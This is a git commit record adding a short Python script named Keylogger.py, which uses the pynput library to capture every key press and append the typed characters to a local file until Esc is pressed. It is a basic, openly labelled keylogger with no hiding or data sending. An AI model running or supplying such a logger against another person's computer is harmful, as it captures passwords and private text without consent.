2d5fec07653186b0c68e27fb96370a2ff1a313cf
unknown <anantika0410@gmail.com>
2023-03-25 00:38:14 +0530

    first commit

---
+++ Keylogger.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Key, Listener
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("Error getting char")
+
+def keyRelease (key):
+    if key == Key.esc:
+        return False
+
+
+if __name__=="__main__":
+
+ with Listener(on_press=keyPressed, on_release=keyRelease) as listener:
+    listener.join()
